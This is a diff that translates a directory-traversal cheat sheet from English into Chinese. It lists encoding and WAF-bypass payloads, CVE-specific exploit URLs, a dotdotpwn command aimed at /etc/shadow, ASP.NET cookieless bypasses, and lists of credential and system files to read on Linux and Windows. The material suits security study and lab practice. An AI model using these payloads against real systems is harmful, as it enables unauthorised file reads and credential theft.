@@ -1,40 +1,42 @@
-# Directory Traversal
+[原文文档](README.en.md)
 
-> Path Traversal, also known as Directory Traversal, is a type of security vulnerability that occurs when an attacker manipulates variables that reference files with “dot-dot-slash (../)” sequences or similar constructs. This can allow the attacker to access arbitrary files and directories stored on the file system.
+# 目录遍历
 
-## Summary
+> 路径遍历，也称为目录遍历，是一种安全漏洞，当攻击者操纵引用文件的变量使用"点-点-斜杠（../）"序列或类似结构时会发生这种漏洞。这可能允许攻击者访问存储在文件系统上的任意文件和目录。
 
-* [Tools](#tools)
-* [Methodology](#methodology)
-    * [URL Encoding](#url-encoding)
-    * [Double URL Encoding](#double-url-encoding)
-    * [Unicode Encoding](#unicode-encoding)
-    * [Overlong UTF-8 Unicode Encoding](#overlong-utf-8-unicode-encoding)
-    * [Mangled Path](#mangled-path)
-    * [NULL Bytes](#null-bytes)
-    * [Reverse Proxy URL Implementation](#reverse-proxy-url-implementation)
-* [Exploit](#exploit)
-    * [UNC Share](#unc-share)
-    * [ASPNET Cookieless](#asp-net-cookieless)
-    * [IIS Short Name](#iis-short-name)
-    * [Java URL Protocol](#java-url-protocol)
-* [Path Traversal](#path-traversal)
-    * [Linux Files](#linux-files)
-    * [Windows Files](#windows-files)
-* [Labs](#labs)
-* [References](#references)
+## 摘要
 
-## Tools
+* [工具](#tools)
+* [方法论](#methodology)
+    * [URL 编码](#url-encoding)
+    * [双重 URL 编码](#double-url-encoding)
+    * [Unicode 编码](#unicode-encoding)
+    * [过长 UTF-8 Unicode 编码](#overlong-utf-8-unicode-encoding)
+    * [混淆路径](#mangled-path)
+    * [空字节](#null-bytes)
+    * [反向代理 URL 实现](#reverse-proxy-url-implementation)
+* [利用](#exploit)
+    * [UNC 共享](#unc-share)
+    * [ASP NET 无 Cookie](#asp-net-cookieless)
+    * [IIS 短名称](#iis-short-name)
+    * [Java URL 协议](#java-url-protocol)
+* [路径遍历](#path-traversal)
+    * [Linux 文件](#linux-files)
+    * [Windows 文件](#windows-files)
+* [实验环境](#labs)
+* [参考资料](#references)
 
-* [wireghoul/dotdotpwn](https://github.com/wireghoul/dotdotpwn) - The Directory Traversal Fuzzer
+## 工具
+
+* [wireghoul/dotdotpwn](https://github.com/wireghoul/dotdotpwn) - 目录遍历模糊测试器
 
     ```powershell
     perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b
     ```
 
-## Methodology
+## 方法论
 
-We can use the `..` characters to access the parent directory, the following strings are several encoding that can help you bypass a poorly implemented filter.
+我们可以使用 `..` 字符访问父目录，以下字符串是几种编码，可以帮助您绕过实现不佳的过滤器。
 
 ```powershell
 ../
@@ -47,140 +49,140 @@ We can use the `..` characters to access the parent directory, the following str
 %uff0e%uff0e%u2216
 ```
 
-### URL Encoding
+### URL 编码
 
-| Character | Encoded |
+| 字符 | 编码 |
 | --- | -------- |
 | `.` | `%2e` |
 | `/` | `%2f` |
 | `\` | `%5c` |
 
-**Example:** IPConfigure Orchid Core VMS 2.0.5 - Local File Inclusion
+**示例：** IPConfigure Orchid Core VMS 2.0.5 - 本地文件包含
 
 ```ps1
 {{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd
 ```
 
-### Double URL Encoding
+### 双重 URL 编码
 
-Double URL encoding is the process of applying URL encoding twice to a string. In URL encoding, special characters are replaced with a % followed by their hexadecimal ASCII value. Double encoding repeats this process on the already encoded string.
+双重 URL 编码是对字符串应用两次 URL 编码的过程。在 URL 编码中，特殊字符被替换为 % 跟其十六进制 ASCII 值。双重编码对已编码的字符串重复此过程。
 
-| Character | Encoded |
+| 字符 | 编码 |
 | --- | -------- |
 | `.` | `%252e` |
 | `/` | `%252f` |
 | `\` | `%255c` |
 
-**Example:** Spring MVC Directory Traversal Vulnerability (CVE-2018-1271)
+**示例：** Spring MVC 目录遍历漏洞 (CVE-2018-1271)
 
 ```ps1
 {{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
 {{BaseURL}}/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
 ```
 
-### Unicode Encoding
+### Unicode 编码
 
-| Character | Encoded |
+| 字符 | 编码 |
 | --- | -------- |
 | `.` | `%u002e` |
 | `/` | `%u2215` |
 | `\` | `%u2216` |
 
-**Example**: Openfire Administration Console - Authentication Bypass (CVE-2023-32315)
+**示例**: Openfire 管理控制台 - 身份验证绕过 (CVE-2023-32315)
 
 ```js
 {{BaseURL}}/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
 ```
 
-### Overlong UTF-8 Unicode Encoding
+### 过长 UTF-8 Unicode 编码
 
-The UTF-8 standard mandates that each codepoint is encoded using the minimum number of bytes necessary to represent its significant bits. Any encoding that uses more bytes than required is referred to as "overlong" and is considered invalid under the UTF-8 specification. This rule ensures a one-to-one mapping between codepoints and their valid encodings, guaranteeing that each codepoint has a single, unique representation.
+UTF-8 标准规定每个代码点使用表示其有效位所需的最少字节数进行编码。任何使用超过所需字节数的编码都被称为"过长"，在 UTF-8 规范下被认为是无效的。此规则确保代码点与其有效编码之间的一对一映射，保证每个代码点都有单一、唯一的表示。
 
-| Character | Encoded |
+| 字符 | 编码 |
 | --- | -------- |
 | `.` | `%c0%2e`, `%e0%40%ae`, `%c0%ae` |
 | `/` | `%c0%af`, `%e0%80%af`, `%c0%2f` |
 | `\` | `%c0%5c`, `%c0%80%5c` |
 
-### Mangled Path
+### 混淆路径
 
-Sometimes you encounter a WAF which remove the `../` characters from the strings, just duplicate them.
+有时您会遇到从字符串中删除 `../` 字符的 WAF，只需复制它们。
 
 ```powershell
 ..././
 ...\.\
 ```
 
-**Example:**: Mirasys DVMS Workstation <=5.12.6
+**示例:**: Mirasys DVMS 工作站 <=5.12.6
 
 ```ps1
 {{BaseURL}}/.../.../.../.../.../.../.../.../.../windows/win.ini
 ```
 
-### NULL Bytes
+### 空字节
 
-A null byte (`%00`), also known as a null character, is a special control character (0x00) in many programming languages and systems. It is often used as a string terminator in languages like C and C++. In directory traversal attacks, null bytes are used to manipulate or bypass server-side input validation mechanisms.
+空字节（`%00`），也称为空字符，是许多编程语言和系统中的特殊控制字符（0x00）。它通常在 C 和 C++ 等语言中用作字符串终止符。在目录遍历攻击中，空字节用于操作或绕过服务器端输入验证机制。
 
-**Example:** Homematic CCU3 CVE-2019-9726
+**示例:** Homematic CCU3 CVE-2019-9726
 
 ```js
 {{BaseURL}}/.%00./.%00./etc/passwd
 ```
 
-**Example:** Kyocera Printer d-COPIA253MF CVE-2020-23575
+**示例:** Kyocera 打印机 d-COPIA253MF CVE-2020-23575
 
 ```js
 {{BaseURL}}/wlmeng/../../../../../../../../../../../etc/passwd%00index.htm
 ```
 
-### Reverse Proxy URL Implementation
+### 反向代理 URL 实现
 
-Nginx treats `/..;/` as a directory while Tomcat treats it as it would treat `/../` which allows us to access arbitrary servlets.
+Nginx 将 `/..;/` 视为目录，而 Tomcat 将其视为 `/../`，这允许我们访问任意 servlet。
 
 ```powershell
 ..;/
 ```
 
-**Example**: Pascom Cloud Phone System CVE-2021-45967
+**示例**: Pascom 云电话系统 CVE-2021-45967
 
-A configuration error between NGINX and a backend Tomcat server leads to a path traversal in the Tomcat server, exposing unintended endpoints.
+NGINX 和后端 Tomcat 服务器之间的配置错误导致 Tomcat 服务器中的路径遍历，暴露了意外端点。
 
 ```js
 {{BaseURL}}/services/pluginscript/..;/..;/..;/getFavicon?host={{interactsh-url}}
 ```
 
-## Exploit
+## 利用
 
-These exploits affect mechanism linked to specific technologies.
+这些利用影响与特定技术相关的机制。
 
-### UNC Share
+### UNC 共享
 
-A UNC (Universal Naming Convention) share is a standard format used to specify the location of resources, such as shared files, directories, or devices, on a network in a platform-independent manner. It is commonly used in Windows environments but is also supported by other operating systems.
+UNC（通用命名约定）共享是一种标准格式，用于以独立于平台的方式指定网络上资源（如共享文件、目录或设备）的位置。它常用于 Windows 环境，但也受其他操作系统支持。
 
-An attacker can inject a **Windows** UNC share (`\\UNC\share\name`) into a software system to potentially redirect access to an unintended location or arbitrary file.
+攻击者可以将 **Windows** UNC 共享（`\\UNC\share\name`）注入到软件系统中，以潜在地将访问重定向到意外位置或任意文件。
 
 ```powershell
 \\localhost\c$\windows\win.ini
 ```
 
-Also the machine might also authenticate on this remote share, thus sending an NTLM exchange.
+此外机器也可能在此远程共享上进行身份验证，从而发送 NTLM 交换。
 
-### ASP NET Cookieless
+### ASP NET 无 Cookie
 
-When cookieless session state is enabled. Instead of relying on a cookie to identify the session, ASP.NET modifies the URL by embedding the Session ID directly into it.
+当启用无 Cookie 会话状态时。ASP.NET 依赖于 Cookie 来标识会话，而是通过将会话 ID 直接嵌入 URL 来修改 URL。
 
-For example, a typical URL might be transformed from: `http://example.com/page.aspx` to something like: `http://example.com/(S(lit3py55t21z5v55vlm25s55))/page.aspx`. The value within `(S(...))` is the Session ID.
+例如，典型的 URL 可能从：`http://example.com/page.aspx` 转换为类似：`http://example.com/(S(lit3py55t21z5v55vlm25s55))/page.aspx` 的内容。`(S(...))` 内的值是会话 ID。
 
-| .NET Version   | URI                        |
+| .NET 版本   | URI                        |
 | -------------- | -------------------------- |
 | V1.0, V1.1     | /(XXXXXXXX)/               |
 | V2.0+          | /(S(XXXXXXXX))/            |
 | V2.0+          | /(A(XXXXXXXX)F(YYYYYYYY))/ |
 | V2.0+          | ...                        |
 
-We can use this behavior to bypass filtered URLs.
+我们可以使用此行为来绕过过滤的 URL。
 
-* If your application is in the main folder
+* 如果您的应用程序在主文件夹中
 
     ```ps1
     /(S(X))/
@@ -190,7 +192,7 @@ We can use this behavior to bypass filtered URLs.
     /(S(x))/b/(S(x))in/Navigator.dll
     ```
 
-* If your application is in a subfolder
+* 如果您的应用程序在子文件夹中
 
     ```ps1
     /MyApp/(S(X))/
@@ -198,16 +200,16 @@ We can use this behavior to bypass filtered URLs.
     /admin/Foobar/(S(X))/../(S(X))/main.aspx
     ```
 
-| CVE            | Payload                                        |
+| CVE            | 载荷                                        |
 | -------------- | ---------------------------------------------- |
 | CVE-2023-36899 | /WebForm/(S(X))/prot/(S(X))ected/target1.aspx  |
 | -              | /WebForm/(S(X))/b/(S(X))in/target2.aspx        |
 | CVE-2023-36560 | /WebForm/pro/(S(X))tected/target1.aspx/(S(X))/ |
 | -              | /WebForm/b/(S(X))in/target2.aspx/(S(X))/       |
 
-### IIS Short Name
+### IIS 短名称
 
-The IIS Short Name vulnerability exploits a quirk in Microsoft's Internet Information Services (IIS) web server that allows attackers to determine the existence of files or directories with names longer than the 8.3 format (also known as short file names) on a web server.
+IIS 短名称漏洞利用了微软 Internet 信息服务 (IIS) Web 服务器的一个怪癖，允许攻击者确定 Web 服务器上具有超过 8.3 格式（也称为短文件名）的名称的文件或目录的存在。
 
 * [irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)
 
@@ -222,20 +224,20 @@ The IIS Short Name vulnerability exploits a quirk in Microsoft's Internet Inform
     shortscan http://example.org/
     ```
 
-### Java URL Protocol
+### Java URL 协议
 
-Java's URL protocol when `new URL('')` is used allows the format `url:URL`
+当使用 `new URL('')` 时，Java 的 URL 协议允许格式 `url:URL`
 
 ```powershell
 url:file:///etc/passwd
 url:http://127.0.0.1:8080
 ```
 
-## Path Traversal
+## 路径遍历
 
-### Linux Files
+### Linux 文件
 
-* Operating System and Informations
+* 操作系统和信息
 
     ```powershell
     /etc/issue
@@ -244,10 +246,10 @@ url:http://127.0.0.1:8080
     /etc/motd
     ```
 
-* Processes
+* 进程
 
     ```ps1
-    /proc/[0-9]*/fd/[0-9]*   # first number is the PID, second is the filedescriptor
+    /proc/[0-9]*/fd/[0-9]*   # 第一个数字是 PID，第二个是文件描述符
     /proc/self/environ
     /proc/version
     /proc/cmdline
@@ -255,7 +257,7 @@ url:http://127.0.0.1:8080
     /proc/mounts
     ```
 
-* Network
+* 网络
 
     ```ps1
     /proc/net/arp
@@ -264,14 +266,14 @@ url:http://127.0.0.1:8080
     /proc/net/udp
     ```
 
-* Current Path
+* 当前路径
 
     ```ps1
     /proc/self/cwd/index.php
     /proc/self/cwd/main.py
     ```
 
-* Indexing
+* 索引
 
     ```ps1
     /var/lib/mlocate/mlocate.db
@@ -279,7 +281,7 @@ url:http://127.0.0.1:8080
     /var/lib/mlocate.db
     ```
 
-* Credentials and history
+* 凭据和历史
 
     ```ps1
     /etc/passwd
@@ -298,16 +300,16 @@ url:http://127.0.0.1:8080
     /var/run/secrets/kubernetes.io/serviceaccount
     ```
 
-### Windows Files
+### Windows 文件
 
-The files `license.rtf` and `win.ini` are consistently present on modern Windows systems, making them a reliable target for testing path traversal vulnerabilities. While their content isn't particularly sensitive or interesting, they serves well as a proof of concept.
+文件 `license.rtf` 和 `win.ini` 在现代 Windows 系统中始终存在，使它们成为测试路径遍历漏洞的可靠目标。虽然它们的内容不是特别敏感或有趣，但它们很好地用作概念证明。
 
 ```powershell
 C:\Windows\win.ini
 C:\windows\system32\license.rtf
 ```
 
-A list of files / paths to probe when arbitrary files can be read on a Microsoft Windows operating system: [soffensive/windowsblindread](https://github.com/soffensive/windowsblindread)
+在 Microsoft Windows 操作系统上可以读取任意文件时要探测的文件/路径列表：[soffensive/windowsblindread](https://github.com/soffensive/windowsblindread)
 
 ```powershell
 c:/inetpub/logs/logfiles
@@ -333,23 +335,23 @@ c:/windows/repair/sam
 c:/windows/repair/system
 ```
 
-## Labs
+## 实验环境
 
-* [PortSwigger - File path traversal, simple case](https://portswigger.net/web-security/file-path-traversal/lab-simple)
-* [PortSwigger - File path traversal, traversal sequences blocked with absolute path bypass](https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass)
-* [PortSwigger - File path traversal, traversal sequences stripped non-recursively](https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively)
-* [PortSwigger - File path traversal, traversal sequences stripped with superfluous URL-decode](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)
-* [PortSwigger - File path traversal, validation of start of path](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path)
-* [PortSwigger - File path traversal, validation of file extension with null byte bypass](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)
+* [PortSwigger - 文件路径遍历，简单案例](https://portswigger.net/web-security/file-path-traversal/lab-simple)
+* [PortSwigger - 文件路径遍历，使用绝对路径绕过阻止遍历序列](https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass)
+* [PortSwigger - 文件路径遍历，非递归移除遍历序列](https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively)
+* [PortSwigger - 文件路径遍历，使用冗余 URL 解码移除遍历序列](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)
+* [PortSwigger - 文件路径遍历，路径开始验证](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path)
+* [PortSwigger - 文件路径遍历，使用空字节绕过验证文件扩展名](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)
 
-## References
+## 参考资料
 
-* [Cookieless ASPNET - Soroush Dalili - March 27, 2023](https://twitter.com/irsdl/status/1640390106312835072)
-* [CWE-40: Path Traversal: '\\UNC\share\name\' (Windows UNC Share) - CWE Mitre - December 27, 2018](https://cwe.mitre.org/data/definitions/40.html)
-* [Directory traversal - Portswigger - March 30, 2019](https://portswigger.net/web-security/file-path-traversal)
-* [Directory traversal attack - Wikipedia - August 5,  2024](https://en.wikipedia.org/wiki/Directory_traversal_attack)
-* [EP 057 | Proc filesystem tricks & locatedb abuse with @_remsio_ & @_bluesheet - TheLaluka - November 30, 2023](https://youtu.be/YlZGJ28By8U)
-* [Exploiting Blind File Reads / Path Traversal Vulnerabilities on Microsoft Windows Operating Systems - @evisneffos - 19 June 2018](https://web.archive.org/web/20200919055801/http://www.soffensive.com/2018/06/exploiting-blind-file-reads-path.html)
-* [NGINX may be protecting your applications from traversal attacks without you even knowing - Rotem Bar - September 24, 2020](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d?source=friends_link&sk=e9ddbadd61576f941be97e111e953381)
-* [Path Traversal Cheat Sheet: Windows - @HollyGraceful - May 17, 2015](https://web.archive.org/web/20170123115404/https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/)
-* [Understand How the ASP.NET Cookieless Feature Works - Microsoft Documentation - June 24, 2011](https://learn.microsoft.com/en-us/previous-versions/dotnet/articles/aa479315(v=msdn.10))
+* [无 Cookie ASPNET - Soroush Dalili - 2023年3月27日](https://twitter.com/irsdl/status/1640390106312835072)
+* [CWE-40: 路径遍历：'\\UNC\share\name\' (Windows UNC 共享) - CWE Mitre - 2018年12月27日](https://cwe.mitre.org/data/definitions/40.html)
+* [目录遍历 - Portswigger - 2019年3月30日](https://portswigger.net/web-security/file-path-traversal)
+* [目录遍历攻击 - Wikipedia - 2024年8月5日](https://en.wikipedia.org/wiki/Directory_traversal_attack)
+* [EP 057 | Proc 文件系统技巧和 locatedb 滥用 @_remsio_ & @_bluesheet - TheLaluka - 2023年11月30日](https://youtu.be/YlZGJ28By8U)
+* [利用 Microsoft Windows 操作系统上的盲文件读取/路径遍历漏洞 - @evisneffos - 2018年6月19日](https://web.archive.org/web/20200919055801/http://www.soffensive.com/2018/06/exploiting-blind-file-reads-path.html)
+* [NGINX 可能在您不知情的情况下保护您的应用程序免受遍历攻击 - Rotem Bar - 2020年9月24日](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d?source=friends_link&sk=e9ddbadd61576f941be97e111e953381)
+* [路径遍历备忘单：Windows - @HollyGraceful - 2015年5月17日](https://web.archive.org/web/20170123115404/https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/)
+* [了解 ASP.NET 无 Cookie 功能的工作原理 - Microsoft 文档 - 2011年6月24日](https://learn.microsoft.com/en-us/previous-versions/dotnet/articles/aa479315(v=msdn.10))
